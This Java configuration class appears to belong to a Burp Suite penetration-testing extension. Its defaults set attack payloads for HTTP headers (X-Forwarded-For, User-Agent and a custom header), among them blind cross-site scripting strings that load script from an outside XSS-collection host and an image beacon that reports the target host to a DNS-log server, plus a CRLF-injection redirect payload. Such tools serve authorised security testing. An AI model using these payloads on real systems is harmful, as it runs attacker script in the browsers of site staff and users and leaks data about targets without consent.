package config;

import java.util.HashMap;

import burp.IBurpExtenderCallbacks;

public class ConfigObject {
	
	public HashMap<String,String> basicConfigs = new HashMap<String,String>();
	public int enableStatus = IBurpExtenderCallbacks.TOOL_PROXY;
	public boolean onlyForScope = true;
    
	ConfigObject(){
    	//to resolve "default constructor not found" error
	}
    
	public ConfigObject(String ConfigName){
		
		basicConfigs.put("DNSlogServer", "bit.0y0.link");
		basicConfigs.put("browserPath", "C:\\Program Files\\Mozilla Firefox\\firefox.exe");
		basicConfigs.put("tokenHeaders", "token,Authorization,Auth,jwt");
		basicConfigs.put("removeHeaders", "Last-Modified,If-Modified-Since,If-None-Match");
		
		basicConfigs.put("<add-or-replace>X-Forwarded-For", "'\\\"/><script src=https://bmw.xss.ht></script>");
		basicConfigs.put("<append>User-Agent", "'\\\"/><script src=https://bmw.xss.ht></script><img/src=bit.0y0.link/%host>");
		basicConfigs.put("<add-or-replace>bit4woo", "'\\\"/><script src=https://bmw.xss.ht></script><img/src=bit.0y0.link/%host>");
		basicConfigs.put("<payload>CRLF", "//%0d%0a/http://www.baidu.com/bit4");
	}

	
	public HashMap<String, String> getBasicConfigs() {
		return basicConfigs;
	}

	public void setBasicConfigs(HashMap<String, String> basicConfigs) {
		this.basicConfigs = basicConfigs;
	}

	public static void main(String args[]) {
		
	}
	
}
